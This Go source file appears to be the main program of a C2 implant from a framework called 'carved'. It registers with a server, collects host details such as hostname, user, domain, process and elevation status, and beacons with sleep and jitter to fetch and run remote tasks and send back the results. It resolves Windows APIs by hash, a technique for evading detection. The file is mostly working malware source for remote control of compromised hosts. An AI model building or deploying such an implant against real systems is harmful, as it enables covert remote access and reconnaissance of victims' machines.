package main

import (
	"fmt"
	"os"
	"runtime"
	"time"
	"unsafe"

	"github.com/google/uuid"

	"github.com/carved4/carved/implant/pkg/tasks"
	"github.com/carved4/carved/implant/pkg/transport"
	"github.com/carved4/carved/shared/crypto"
	"github.com/carved4/carved/shared/proto"
	wc "github.com/carved4/go-wincall"
)

var (
	ServerURL     = "http://127.0.0.1:8443/"
	Sleep         = uint32(2)
	Jitter        = uint8(10)
	EncryptionKey = ""
	UserAgent     = ""
)

func main() {
	if EncryptionKey != "" {
		if err := crypto.SetKey(EncryptionKey); err != nil {
			fmt.Printf("[!] failed to set encryption key: %v\n", err)
			return
		}
	}

	implantID := uuid.New().String()
	meta := gatherMeta(implantID)
	cfg := &transport.Config{
		ServerURL: ServerURL,
		Sleep:     Sleep,
		Jitter:    Jitter,
		UserAgent: UserAgent,
	}
	tasks.Config.Sleep = &cfg.Sleep
	tasks.Config.Jitter = &cfg.Jitter
	tasks.Config.ServerURL = ServerURL
	t := transport.NewHTTPTransport(cfg, implantID)
	fmt.Println("[+] attempting to register...")
	for {
		err := t.Register(meta)
		if err == nil {
			fmt.Println("[+] registered successfully")
			break
		}
		fmt.Printf("[+] register failed: %v, retrying...\n", err)
		time.Sleep(t.Sleep())
	}

	var pendingResults []*proto.TaskResult

	for {

		newTasks, err := t.Beacon(pendingResults)
		if err != nil {
			fmt.Printf("[+] beacon error: %v\n", err)
		} else {
			if len(pendingResults) > 0 {
				fmt.Printf("[+] sent %d results to server\n", len(pendingResults))
			}
			pendingResults = nil

			if len(newTasks) > 0 {
				fmt.Printf("[+] received %d tasks\n", len(newTasks))
			}
			for _, task := range newTasks {
				fmt.Printf("[+] executing task: %s (%s)\n", task.Type, task.ID[:8])
				result := tasks.Execute(task)
				if result != nil {
					fmt.Printf("[+] task completed: %s (status: %s)\n", task.ID[:8], result.Status)
					pendingResults = append(pendingResults, result)
				}
			}
		}

		time.Sleep(t.Sleep())
	}
}

func gatherMeta(implantID string) *proto.ImplantMeta {
	hostname, _ := os.Hostname()
	username := getUsername()
	domain := getDomain()
	elevated := isElevated()
	pid := uint32(os.Getpid())
	process := getProcessName()

	return &proto.ImplantMeta{
		ID:        implantID,
		Hostname:  hostname,
		Username:  username,
		Domain:    domain,
		OS:        runtime.GOOS,
		Arch:      runtime.GOARCH,
		PID:       pid,
		Process:   process,
		Elevated:  elevated,
		FirstSeen: time.Now().UTC(),
		LastSeen:  time.Now().UTC(),
		Sleep:     Sleep,
		Jitter:    Jitter,
	}
}

func getUsername() string {
	advapi32 := wc.LoadLibraryLdr("advapi32.dll")
	getUserNameW := wc.GetFunctionAddress(advapi32, wc.GetHash("GetUserNameW"))

	buf := make([]uint16, 256)
	size := uint32(256)

	ret, _, _ := wc.CallG0(getUserNameW, uintptr(unsafe.Pointer(&buf[0])), uintptr(unsafe.Pointer(&size)))
	if ret != 0 {
		return wc.UTF16ToString(&buf[0])
	}
	return os.Getenv("USERNAME")
}

func getDomain() string {

	if domain := os.Getenv("USERDOMAIN"); domain != "" {
		return domain
	}
	return os.Getenv("COMPUTERNAME")
}

func isElevated() bool {

	advapi32 := wc.LoadLibraryLdr("advapi32.dll")
	openProcessToken := wc.GetFunctionAddress(advapi32, wc.GetHash("OpenProcessToken"))
	getTokenInformation := wc.GetFunctionAddress(advapi32, wc.GetHash("GetTokenInformation"))

	k32 := wc.GetModuleBase(wc.GetHash("kernel32.dll"))
	getCurrentProcess := wc.GetFunctionAddress(k32, wc.GetHash("GetCurrentProcess"))
	closeHandle := wc.GetFunctionAddress(k32, wc.GetHash("CloseHandle"))

	hProcess, _, _ := wc.CallG0(getCurrentProcess)

	var hToken uintptr
	ret, _, _ := wc.CallG0(openProcessToken, hProcess, 0x0008, uintptr(unsafe.Pointer(&hToken)))
	if ret == 0 {
		return false
	}
	defer wc.CallG0(closeHandle, hToken)

	var elevation uint32
	var returnLength uint32
	ret, _, _ = wc.CallG0(getTokenInformation, hToken, 20, uintptr(unsafe.Pointer(&elevation)), 4, uintptr(unsafe.Pointer(&returnLength)))
	if ret == 0 {
		return false
	}

	return elevation != 0
}

func getProcessName() string {
	path, err := os.Executable()
	if err != nil {
		return "unknown"
	}

	for i := len(path) - 1; i >= 0; i-- {
		if path[i] == '\\' || path[i] == '/' {
			return path[i+1:]
		}
	}
	return path
}
